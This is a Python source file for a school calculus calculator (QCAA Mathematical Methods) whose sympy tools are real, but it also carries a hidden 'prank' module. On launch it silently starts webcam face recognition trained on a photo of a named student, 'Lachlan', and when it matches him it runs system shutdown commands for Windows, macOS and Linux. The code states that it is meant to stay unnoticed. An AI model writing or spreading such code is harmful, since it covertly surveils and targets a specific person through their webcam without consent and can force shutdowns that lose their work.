"""
QCAA Mathematical Methods Calculator
with a special feature for Lachlan :)
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import sympy as sp
import threading
import os
import sys
import time
import platform

# ── Face detection imports (optional – prank only works if installed) ──────────
try:
    import cv2
    import numpy as np
    FACE_RECOGNITION_AVAILABLE = True
except ImportError:
    FACE_RECOGNITION_AVAILABLE = False

# ── Sympy symbols ──────────────────────────────────────────────────────────────
x, t, n, a, b, c = sp.symbols('x t n a b c')

# ══════════════════════════════════════════════════════════════════════════════
# PRANK ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class LachlanDetector:
    """Watches the webcam. If Lachlan is detected → shut down the computer.

    Uses OpenCV LBPH face recogniser — no dlib/cmake compilation required.
    Confidence is a distance score: lower = better match. Threshold ~90 works
    well for a single training image.
    """

    CONFIDENCE_THRESHOLD = 115  # lower = stricter match; tune with test_prank.py
    FACE_SIZE = (100, 100)

    def __init__(self, photo_path: str = "lachlan.jpg"):
        self.photo_path = photo_path
        self.running = False
        self._thread = None
        self._recognizer = None
        self._cascade = None

    def load_target(self) -> bool:
        if not FACE_RECOGNITION_AVAILABLE:
            return False
        if not os.path.exists(self.photo_path):
            return False

        # Load Haar cascade (bundled with opencv)
        cascade_path = cv2.data.haarcascades + "haarcascade_frontalface_default.xml"
        self._cascade = cv2.CascadeClassifier(cascade_path)

        img = cv2.imread(self.photo_path)
        if img is None:
            return False
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        faces = self._cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5)
        if len(faces) == 0:
            return False

        # Use the largest detected face as the training sample
        x_, y_, w_, h_ = max(faces, key=lambda f: f[2] * f[3])
        face_crop = cv2.resize(gray[y_:y_+h_, x_:x_+w_], self.FACE_SIZE)

        # Train LBPH on that single crop + a few augmented variants for robustness
        samples, labels = [], []
        for flip in (False, True):
            img_ = cv2.flip(face_crop, 1) if flip else face_crop
            for brightness in (0, 20, -20):
                adjusted = np.clip(img_.astype(np.int16) + brightness, 0, 255).astype(np.uint8)
                samples.append(adjusted)
                labels.append(0)

        self._recognizer = cv2.face.LBPHFaceRecognizer_create()
        self._recognizer.train(samples, np.array(labels))
        return True

    def _shutdown(self):
        system = platform.system()
        if system == "Windows":
            os.system("shutdown /s /t 0")
        elif system == "Darwin":
            os.system("sudo shutdown -h now")
        else:
            os.system("systemctl poweroff 2>/dev/null || sudo shutdown -h now 2>/dev/null || poweroff")

    def _watch(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return

        while self.running:
            ret, frame = cap.read()
            if not ret:
                time.sleep(0.5)
                continue

            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            faces = self._cascade.detectMultiScale(
                gray, scaleFactor=1.1, minNeighbors=5, minSize=(60, 60)
            )

            for (fx, fy, fw, fh) in faces:
                face_crop = cv2.resize(gray[fy:fy+fh, fx:fx+fw], self.FACE_SIZE)
                label, confidence = self._recognizer.predict(face_crop)
                if label == 0 and confidence < self.CONFIDENCE_THRESHOLD:
                    cap.release()
                    self._shutdown()
                    return

            time.sleep(0.25)

        cap.release()

    def start(self):
        if not self.load_target():
            return False
        self.running = True
        self._thread = threading.Thread(target=self._watch, daemon=True)
        self._thread.start()
        return True

    def stop(self):
        self.running = False


# ══════════════════════════════════════════════════════════════════════════════
# CALCULUS HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def safe_parse(expr_str: str):
    """Parse a string into a sympy expression with common shortcuts."""
    expr_str = expr_str.replace("^", "**")
    local = {
        "x": x, "t": t, "e": sp.E, "pi": sp.pi,
        "sin": sp.sin, "cos": sp.cos, "tan": sp.tan,
        "asin": sp.asin, "acos": sp.acos, "atan": sp.atan,
        "ln": sp.ln, "log": sp.log, "exp": sp.exp,
        "sqrt": sp.sqrt, "abs": sp.Abs,
    }
    return sp.sympify(expr_str, locals=local)


def pretty(expr) -> str:
    return sp.pretty(expr, use_unicode=True)


# ══════════════════════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ══════════════════════════════════════════════════════════════════════════════

class QCAACalculator(tk.Tk):

    ACCENT  = "#1a73e8"
    BG      = "#1e1e2e"
    PANEL   = "#2a2a3e"
    TEXT    = "#cdd6f4"
    GREEN   = "#a6e3a1"
    RED     = "#f38ba8"
    YELLOW  = "#f9e2af"
    FONT    = ("Consolas", 12)
    HFONT   = ("Consolas", 14, "bold")

    def __init__(self):
        super().__init__()
        self.title("QCAA Mathematical Methods Calculator")
        self.geometry("920x700")
        self.configure(bg=self.BG)
        self.resizable(True, True)

        self.detector = LachlanDetector()
        self._build_ui()
        self._start_prank_silently()

    # ── Build UI ───────────────────────────────────────────────────────────────

    def _build_ui(self):
        style = ttk.Style(self)
        style.theme_use("default")
        style.configure("TNotebook",        background=self.BG,    borderwidth=0)
        style.configure("TNotebook.Tab",    background=self.PANEL, foreground=self.TEXT,
                        padding=[14, 6],    font=self.FONT)
        style.map("TNotebook.Tab",
                  background=[("selected", self.ACCENT)],
                  foreground=[("selected", "#ffffff")])
        style.configure("TFrame",           background=self.BG)
        style.configure("TLabel",           background=self.BG,    foreground=self.TEXT,
                        font=self.FONT)
        style.configure("TEntry",           fieldbackground=self.PANEL, foreground=self.TEXT,
                        font=self.FONT,     insertcolor=self.TEXT)
        style.configure("TButton",          background=self.ACCENT, foreground="#ffffff",
                        font=self.FONT,     padding=[10, 6])
        style.map("TButton", background=[("active", "#1558b0")])

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=10, pady=10)

        tabs = [
            ("Differentiation",     self._tab_differentiation),
            ("Integration",         self._tab_integration),
            ("Limits",              self._tab_limits),
            ("Chain / Product / Quotient", self._tab_rules),
            ("Optimisation",        self._tab_optimisation),
            ("Area Between Curves", self._tab_area),
            ("Differential Eqs",    self._tab_diffeq),
            ("Trig & Exp/Log",      self._tab_trig_explog),
        ]

        for name, builder in tabs:
            frame = ttk.Frame(nb)
            nb.add(frame, text=name)
            builder(frame)

    # ── Generic helpers ────────────────────────────────────────────────────────

    def _section(self, parent, title):
        lbl = tk.Label(parent, text=title, bg=self.BG, fg=self.ACCENT,
                       font=self.HFONT, anchor="w")
        lbl.pack(fill="x", padx=14, pady=(14, 4))

    def _row(self, parent, label, **entry_kw):
        frame = ttk.Frame(parent)
        frame.pack(fill="x", padx=14, pady=3)
        ttk.Label(frame, text=label, width=24, anchor="e").pack(side="left", padx=(0, 8))
        entry = ttk.Entry(frame, **entry_kw)
        entry.pack(side="left", fill="x", expand=True)
        return entry

    def _output(self, parent):
        out = scrolledtext.ScrolledText(
            parent, height=8, bg=self.PANEL, fg=self.GREEN,
            font=("Consolas", 11), insertbackground=self.TEXT,
            relief="flat", wrap="word", state="disabled"
        )
        out.pack(fill="both", expand=True, padx=14, pady=(6, 14))
        return out

    def _btn(self, parent, text, cmd):
        ttk.Button(parent, text=text, command=cmd).pack(padx=14, pady=6, anchor="w")

    def _write(self, widget, text: str):
        widget.configure(state="normal")
        widget.delete("1.0", "end")
        widget.insert("end", text)
        widget.configure(state="disabled")

    def _error(self, widget, err: Exception):
        self._write(widget, f"Error: {err}\n\nCheck your expression and try again.")

    # ── Tab: Differentiation ───────────────────────────────────────────────────

    def _tab_differentiation(self, parent):
        self._section(parent, "Differentiation  (d/dx or d/dt)")
        self.diff_expr  = self._row(parent, "f(x) or f(t):")
        self.diff_var   = self._row(parent, "Variable (x or t):")
        self.diff_order = self._row(parent, "Order (default 1):")
        self.diff_out   = self._output(parent)
        self._btn(parent, "Differentiate", self._do_diff)

    def _do_diff(self):
        try:
            expr  = safe_parse(self.diff_expr.get())
            var   = sp.Symbol(self.diff_var.get().strip() or "x")
            order = int(self.diff_order.get().strip() or "1")
            result = sp.diff(expr, var, order)
            simplified = sp.simplify(result)
            self._write(self.diff_out,
                f"f  = {pretty(expr)}\n\n"
                f"f{'′' * order} = {pretty(result)}\n\n"
                f"Simplified: {pretty(simplified)}"
            )
        except Exception as e:
            self._error(self.diff_out, e)

    # ── Tab: Integration ───────────────────────────────────────────────────────

    def _tab_integration(self, parent):
        self._section(parent, "Integration  (indefinite & definite)")
        self.int_expr  = self._row(parent, "f(x):")
        self.int_var   = self._row(parent, "Variable (default x):")
        self.int_lower = self._row(parent, "Lower bound (leave blank for indefinite):")
        self.int_upper = self._row(parent, "Upper bound:")
        self.int_out   = self._output(parent)
        self._btn(parent, "Integrate", self._do_int)

    def _do_int(self):
        try:
            expr = safe_parse(self.int_expr.get())
            var  = sp.Symbol(self.int_var.get().strip() or "x")
            lo   = self.int_lower.get().strip()
            hi   = self.int_upper.get().strip()

            if lo and hi:
                lo_e = safe_parse(lo)
                hi_e = safe_parse(hi)
                result = sp.integrate(expr, (var, lo_e, hi_e))
                numeric = sp.N(result, 6)
                self._write(self.int_out,
                    f"∫[{lo}, {hi}] {pretty(expr)} d{var}\n\n"
                    f"= {pretty(result)}\n\n"
                    f"≈ {numeric}"
                )
            else:
                result = sp.integrate(expr, var)
                self._write(self.int_out,
                    f"∫ {pretty(expr)} d{var}\n\n"
                    f"= {pretty(result)} + C"
                )
        except Exception as e:
            self._error(self.int_out, e)

    # ── Tab: Limits ────────────────────────────────────────────────────────────

    def _tab_limits(self, parent):
        self._section(parent, "Limits")
        self.lim_expr = self._row(parent, "f(x):")
        self.lim_var  = self._row(parent, "Variable (default x):")
        self.lim_to   = self._row(parent, "Limit point (e.g. 0, oo, -oo):")
        self.lim_dir  = self._row(parent, "Direction (+ / - / ±, default ±):")
        self.lim_out  = self._output(parent)
        self._btn(parent, "Compute Limit", self._do_limit)

    def _do_limit(self):
        try:
            expr = safe_parse(self.lim_expr.get())
            var  = sp.Symbol(self.lim_var.get().strip() or "x")
            to   = safe_parse(self.lim_to.get().strip() or "0")
            dir_ = self.lim_dir.get().strip() or "±"

            if dir_ == "+":
                result = sp.limit(expr, var, to, "+")
            elif dir_ == "-":
                result = sp.limit(expr, var, to, "-")
            else:
                result = sp.limit(expr, var, to)

            self._write(self.lim_out,
                f"lim  {pretty(expr)}\n"
                f"{var}→{to}{dir_ if dir_ != '±' else ''}\n\n"
                f"= {pretty(result)}"
            )
        except Exception as e:
            self._error(self.lim_out, e)

    # ── Tab: Chain / Product / Quotient rules ─────────────────────────────────

    def _tab_rules(self, parent):
        self._section(parent, "Chain / Product / Quotient Rules")

        # Chain
        tk.Label(parent, text="── Chain Rule  d/dx[f(g(x))] ──",
                 bg=self.BG, fg=self.YELLOW, font=self.FONT).pack(anchor="w", padx=14)
        self.chain_f = self._row(parent, "f(u)  (use u as inner):")
        self.chain_g = self._row(parent, "g(x)  (inner function):")

        # Product
        tk.Label(parent, text="── Product Rule  d/dx[u·v] ──",
                 bg=self.BG, fg=self.YELLOW, font=self.FONT).pack(anchor="w", padx=14, pady=(10,0))
        self.prod_u = self._row(parent, "u(x):")
        self.prod_v = self._row(parent, "v(x):")

        # Quotient
        tk.Label(parent, text="── Quotient Rule  d/dx[u/v] ──",
                 bg=self.BG, fg=self.YELLOW, font=self.FONT).pack(anchor="w", padx=14, pady=(10,0))
        self.quot_u = self._row(parent, "u(x):")
        self.quot_v = self._row(parent, "v(x):")

        self.rules_out = self._output(parent)
        self._btn(parent, "Compute All", self._do_rules)

    def _do_rules(self):
        lines = []
        u_sym = sp.Symbol("u")
        try:
            f_expr = safe_parse(self.chain_f.get().replace("u", "u_sym_placeholder"))
        except Exception:
            f_expr = None

        # Chain
        try:
            f_raw = self.chain_f.get().strip()
            g_raw = self.chain_g.get().strip()
            if f_raw and g_raw:
                u_s  = sp.Symbol("u")
                f_u  = safe_parse(f_raw.replace("u", "(u)"))
                g_x  = safe_parse(g_raw)
                comp = f_u.subs(sp.Symbol("u"), g_x)
                result = sp.diff(comp, x)
                lines.append(f"Chain Rule:\nd/dx[f(g(x))] = {pretty(sp.simplify(result))}\n")
        except Exception as e:
            lines.append(f"Chain Rule error: {e}\n")

        # Product
        try:
            u_raw = self.prod_u.get().strip()
            v_raw = self.prod_v.get().strip()
            if u_raw and v_raw:
                u_e = safe_parse(u_raw)
                v_e = safe_parse(v_raw)
                result = sp.diff(u_e * v_e, x)
                manual = sp.diff(u_e, x) * v_e + u_e * sp.diff(v_e, x)
                lines.append(
                    f"Product Rule:\n"
                    f"u′v + uv′ = {pretty(sp.simplify(manual))}\n"
                    f"Simplified = {pretty(sp.simplify(result))}\n"
                )
        except Exception as e:
            lines.append(f"Product Rule error: {e}\n")

        # Quotient
        try:
            u_raw = self.quot_u.get().strip()
            v_raw = self.quot_v.get().strip()
            if u_raw and v_raw:
                u_e = safe_parse(u_raw)
                v_e = safe_parse(v_raw)
                result = sp.diff(u_e / v_e, x)
                manual = (sp.diff(u_e, x) * v_e - u_e * sp.diff(v_e, x)) / v_e**2
                lines.append(
                    f"Quotient Rule:\n"
                    f"(u′v − uv′)/v² = {pretty(sp.simplify(manual))}\n"
                    f"Simplified = {pretty(sp.simplify(result))}\n"
                )
        except Exception as e:
            lines.append(f"Quotient Rule error: {e}\n")

        self._write(self.rules_out, "\n".join(lines) if lines else "Fill in at least one rule's fields.")

    # ── Tab: Optimisation ─────────────────────────────────────────────────────

    def _tab_optimisation(self, parent):
        self._section(parent, "Optimisation  (Critical Points & Classifying)")
        self.opt_expr = self._row(parent, "f(x):")
        self.opt_dom  = self._row(parent, "Domain  e.g. -5, 5  (optional):")
        self.opt_out  = self._output(parent)
        self._btn(parent, "Find Critical Points", self._do_opt)

    def _do_opt(self):
        try:
            expr = safe_parse(self.opt_expr.get())
            f1   = sp.diff(expr, x)
            f2   = sp.diff(f1,   x)
            crits = sp.solve(f1, x)

            dom_raw = self.opt_dom.get().strip()
            if dom_raw:
                try:
                    lo_s, hi_s = [s.strip() for s in dom_raw.split(",")]
                    lo_v = float(sp.N(safe_parse(lo_s)))
                    hi_v = float(sp.N(safe_parse(hi_s)))
                    crits = [c for c in crits if lo_v <= float(sp.N(c)) <= hi_v]
                except Exception:
                    pass

            lines = [
                f"f(x)  = {pretty(expr)}",
                f"f′(x) = {pretty(f1)}",
                f"f″(x) = {pretty(f2)}",
                "",
                "Critical points:",
            ]

            for cp in crits:
                y_val  = expr.subs(x, cp)
                f2_val = f2.subs(x, cp)
                sign   = sp.sign(f2_val)
                if sign == -1:
                    kind = "Local maximum"
                elif sign == 1:
                    kind = "Local minimum"
                else:
                    kind = "Possible inflection (f″ = 0, check sign change)"
                lines.append(f"  x = {pretty(cp)}  →  f(x) = {pretty(y_val)}  [{kind}]")

            if not crits:
                lines.append("  None found in domain.")

            infl = sp.solve(f2, x)
            lines += ["", "Inflection points (f″ = 0):"]
            for ip in infl:
                lines.append(f"  x = {pretty(ip)}  →  f(x) = {pretty(expr.subs(x, ip))}")

            self._write(self.opt_out, "\n".join(lines))
        except Exception as e:
            self._error(self.opt_out, e)

    # ── Tab: Area Between Curves ──────────────────────────────────────────────

    def _tab_area(self, parent):
        self._section(parent, "Area Between Curves")
        self.area_f     = self._row(parent, "Upper function f(x):")
        self.area_g     = self._row(parent, "Lower function g(x)  (0 for x-axis):")
        self.area_lower = self._row(parent, "Lower bound a:")
        self.area_upper = self._row(parent, "Upper bound b:")
        self.area_auto  = tk.BooleanVar(value=False)
        chk = tk.Checkbutton(parent, text="Auto-find intersections as bounds",
                              variable=self.area_auto,
                              bg=self.BG, fg=self.TEXT, selectcolor=self.PANEL,
                              font=self.FONT, activebackground=self.BG)
        chk.pack(anchor="w", padx=14, pady=2)
        self.area_out = self._output(parent)
        self._btn(parent, "Calculate Area", self._do_area)

    def _do_area(self):
        try:
            f_e = safe_parse(self.area_f.get())
            g_e = safe_parse(self.area_g.get() or "0")
            diff_fg = f_e - g_e

            if self.area_auto.get():
                intersects = sp.solve(diff_fg, x)
                real_intersects = sorted([float(sp.N(p)) for p in intersects
                                          if sp.im(p) == 0])
                if len(real_intersects) < 2:
                    self._write(self.area_out, "Could not find 2 real intersection points.")
                    return
                lo_v, hi_v = real_intersects[0], real_intersects[-1]
                lo_e, hi_e = sp.Rational(lo_v).limit_denominator(1000), sp.Rational(hi_v).limit_denominator(1000)
            else:
                lo_e = safe_parse(self.area_lower.get())
                hi_e = safe_parse(self.area_upper.get())

            area = sp.integrate(sp.Abs(diff_fg), (x, lo_e, hi_e))
            numeric = sp.N(area, 6)

            self._write(self.area_out,
                f"Area = ∫[{pretty(lo_e)}, {pretty(hi_e)}] |f(x) − g(x)| dx\n\n"
                f"f(x) − g(x) = {pretty(diff_fg)}\n\n"
                f"Exact area  = {pretty(area)}\n"
                f"≈ {numeric} square units"
            )
        except Exception as e:
            self._error(self.area_out, e)

    # ── Tab: Differential Equations ───────────────────────────────────────────

    def _tab_diffeq(self, parent):
        self._section(parent, "Differential Equations  (separable & first-order)")
        tk.Label(parent,
                 text="Enter as: dy/dx = f(x,y)\nUse  y  and  x  as symbols.\nExamples:  x*y   |   x**2 - y   |   -2*y",
                 bg=self.BG, fg=self.YELLOW, font=("Consolas", 11), justify="left"
                 ).pack(anchor="w", padx=14, pady=4)
        self.de_expr  = self._row(parent, "f(x, y)  (RHS):")
        self.de_ic_x  = self._row(parent, "Initial x₀ (optional):")
        self.de_ic_y  = self._row(parent, "Initial y₀ (optional):")
        self.de_out   = self._output(parent)
        self._btn(parent, "Solve ODE", self._do_de)

    def _do_de(self):
        try:
            rhs_str = self.de_expr.get().replace("^", "**")
            y_fn = sp.Function("y")
            y_sym = y_fn(x)

            rhs = sp.sympify(rhs_str, locals={
                "x": x, "y": y_fn(x),
                "sin": sp.sin, "cos": sp.cos, "exp": sp.exp,
                "ln": sp.ln, "sqrt": sp.sqrt, "e": sp.E,
            })
            ode = sp.Eq(y_fn(x).diff(x), rhs)
            sol = sp.dsolve(ode, y_fn(x))

            ic_x = self.de_ic_x.get().strip()
            ic_y = self.de_ic_y.get().strip()

            lines = [f"ODE: dy/dx = {pretty(rhs)}", "", f"General solution:", f"  {pretty(sol)}"]

            if ic_x and ic_y:
                x0 = safe_parse(ic_x)
                y0 = safe_parse(ic_y)
                C1 = sp.Symbol("C1")
                c_val = sp.solve(sol.rhs.subs(x, x0) - y0, C1)
                if c_val:
                    particular = sol.rhs.subs(C1, c_val[0])
                    lines += ["", f"With y({pretty(x0)}) = {pretty(y0)}:",
                              f"  y = {pretty(sp.simplify(particular))}"]

            self._write(self.de_out, "\n".join(lines))
        except Exception as e:
            self._error(self.de_out, e)

    # ── Tab: Trig & Exp/Log ───────────────────────────────────────────────────

    def _tab_trig_explog(self, parent):
        self._section(parent, "Trig, Exponential & Logarithm Toolkit")
        tk.Label(parent,
                 text="Quickly differentiate or integrate standard QCAA functions.",
                 bg=self.BG, fg=self.TEXT, font=("Consolas", 11)).pack(anchor="w", padx=14)

        self.tel_expr = self._row(parent, "Expression:")
        self.tel_var  = self._row(parent, "Variable (default x):")

        frame = ttk.Frame(parent)
        frame.pack(padx=14, pady=6, anchor="w")
        ttk.Button(frame, text="Differentiate", command=lambda: self._do_tel("diff")).pack(side="left", padx=4)
        ttk.Button(frame, text="Integrate (indefinite)", command=lambda: self._do_tel("int")).pack(side="left", padx=4)
        ttk.Button(frame, text="Simplify / Expand", command=lambda: self._do_tel("simplify")).pack(side="left", padx=4)

        self.tel_out = self._output(parent)

        # Reference cheat-sheet
        ref = (
            "── QCAA Reference ───────────────────────────────\n"
            "d/dx[eˣ]       = eˣ\n"
            "d/dx[aˣ]       = aˣ ln(a)\n"
            "d/dx[ln x]     = 1/x\n"
            "d/dx[sin x]    = cos x\n"
            "d/dx[cos x]    = −sin x\n"
            "d/dx[tan x]    = sec²x = 1/cos²x\n"
            "∫ eˣ dx        = eˣ + C\n"
            "∫ 1/x dx       = ln|x| + C\n"
            "∫ sin x dx     = −cos x + C\n"
            "∫ cos x dx     = sin x + C\n"
            "∫ sec²x dx     = tan x + C\n"
        )
        ref_box = scrolledtext.ScrolledText(
            parent, height=14, bg="#16213e", fg=self.YELLOW,
            font=("Consolas", 10), relief="flat", state="normal"
        )
        ref_box.insert("end", ref)
        ref_box.configure(state="disabled")
        ref_box.pack(fill="x", padx=14, pady=(0, 10))

    def _do_tel(self, mode: str):
        try:
            expr = safe_parse(self.tel_expr.get())
            var  = sp.Symbol(self.tel_var.get().strip() or "x")
            if mode == "diff":
                result = sp.diff(expr, var)
                out = f"d/d{var}[{pretty(expr)}]\n\n= {pretty(result)}\n\nSimplified: {pretty(sp.simplify(result))}"
            elif mode == "int":
                result = sp.integrate(expr, var)
                out = f"∫ {pretty(expr)} d{var}\n\n= {pretty(result)} + C"
            else:
                out = (f"Original:  {pretty(expr)}\n"
                       f"Simplified:{pretty(sp.simplify(expr))}\n"
                       f"Expanded:  {pretty(sp.expand(expr))}\n"
                       f"Factored:  {pretty(sp.factor(expr))}")
            self._write(self.tel_out, out)
        except Exception as e:
            self._error(self.tel_out, e)

    # ── Prank ──────────────────────────────────────────────────────────────────

    def _start_prank_silently(self):
        """Start detector in background — totally silent so Lachlan suspects nothing."""
        if not FACE_RECOGNITION_AVAILABLE:
            return
        threading.Thread(target=self._delayed_prank_start, daemon=True).start()

    def _delayed_prank_start(self):
        time.sleep(2)  # let the UI paint first
        self.detector.start()  # returns False silently if lachlan.jpg missing


# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    app = QCAACalculator()
    app.mainloop()
